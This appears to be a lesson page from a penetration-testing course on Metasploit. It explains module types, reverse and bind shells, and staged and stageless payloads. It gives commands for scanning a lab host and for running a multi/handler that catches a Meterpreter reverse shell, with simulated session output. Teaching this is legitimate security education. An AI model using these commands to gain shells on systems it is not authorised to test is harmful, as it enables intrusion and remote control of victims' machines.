
# Metasploit Framework (MSF) Deep Dive

## The Point-and-Click Hacking Tool?
Metasploit is often criticized as a "Skid Tool", but professionals use it daily for one reason: **Reliability**. When you are on a $50k engagement, you don't write a custom Python exploit; you use a battle-tested MSF module.

## 1. Architecture
MSF is modular. Everything is a piece of Lego.

<Mermaid chart={`
graph TD
    MSF[Metasploit Framework]
    MSF --> Exploit[Exploit Modules]
    MSF --> Payload[Payload Modules]
    MSF --> Aux[Auxiliary Modules]
    MSF --> Post[Post-Exploitation]
    
    Exploit -->|Uses| Payload
    Aux -->|Scanner/Fuzzer| Target
`} />

-   **Exploit:** Code that triggers the bug (e.g., MS17-010).
-   **Payload:** What happens after the bug is triggered (e.g., "Give me a shell").
-   **Auxiliary:** Scanners, crawlers, and server emulators (e.g., `ssh_login`).

## 2. Reverse Shell vs Bind Shell
Understanding the connection flow is critical for bypassing Firewalls.

### Reverse Shell (Connect Back)
The Target connects to You (Attacker).
-   **Good:** Bypasses Inbound Firewalls.
-   **Bad:** Blocked if Outbound filtering is strict (e.g., strict Egress filtering).
-   **Payload:** `windows/x64/meterpreter/reverse_tcp`

### Bind Shell (Listen)
The Target opens a port and waits for You.
-   **Good:** If target is behind NAT but has an exposed port.
-   **Bad:** Blocked by almost all Inbound Firewalls.
-   **Payload:** `windows/x64/meterpreter/bind_tcp`

## 3. Staged vs Stageless Payloads
-   **Stageless (`_tcp`):** The entire shellcode (2MB) is sent at once. Stable but large.
    -   Example: `windows/shell_reverse_tcp`
-   **Staged (`/tcp`):** A tiny "Stager" (400 bytes) runs first, allocates memory, and pulls the rest of the malware over the network.
    -   Example: `windows/shell/reverse_tcp` (Note the extra slash).

## 4. Workspaces and Database
Don't hack manually. Use the database.
1.  `service postgresql start`
2.  `msfconsole`
3.  `db_nmap -A 10.10.10.5` -> Automatically saves results to MSF DB.
4.  `hosts` -> Lists all alive hosts.
5.  `services` -> Lists all open ports.

<TerminalSimulator 
    cmd="use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; run" 
    output={`[*] Using configured payload windows/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.35:4444 
[*] Sending stage (200262 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.35:4444 -> 10.10.10.5:49812) at 2025-05-15 11:20:00

meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
`} 
/>

<Note type="tip">
**Pro Tip:** Always use `exploit/multi/handler` to catch shells from *other* tools (like a manual Python exploit or a netcat reverse shell converted to Meterpreter).
</Note>

---

<Quiz 
    question="You are attacking a server that sits behind a strict Corporate Firewall that BLOCKS all incoming connections on non-standard ports, but ALLOWS all outgoing traffic. Which payload type should you use?" 
    options={[
        "windows/meterpreter/bind_tcp",
        "windows/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_http",
        "linux/x86/shell_bind_tcp"
    ]} 
    answer="windows/meterpreter/reverse_tcp" 
/>
